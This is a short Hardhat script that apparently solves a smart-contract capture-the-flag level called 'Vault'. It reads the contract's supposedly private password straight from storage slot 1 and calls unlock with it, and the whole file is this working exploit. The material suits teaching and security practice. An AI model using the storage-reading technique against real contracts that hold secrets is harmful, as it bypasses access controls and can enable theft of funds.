const { ethers } = require("hardhat")
const { symbols, resetNode } = require("../helper-hardhat-config")

async function main() {
    await resetNode()
    let status, tx, res, pass
    let [attacker] = await ethers.getSigners()
    let instanceAddress = "0xb059aFE1405092F5526f6250D58B5627576fA6Ec"
    let target = await ethers.getContractAt("Vault", instanceAddress)

    console.log(`Attacker Address: ${attacker.address}`)
    console.log(`Found target contract at address: ${target.address}`)

    // Attack
    pass = await ethers.provider.getStorageAt(target.address, 1)
    console.log(`Password: ${pass}`)
    tx = await target.unlock(pass)
    await tx.wait(1)

    // Check
    status = await target.locked()
    if (status == false) {
        console.log(`${symbols.success} Unlocked!`)
    } else {
        console.log(`${symbols.error} Still locked!`)
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error)
        process.exit(1)
    })

module.exports = { main: main }
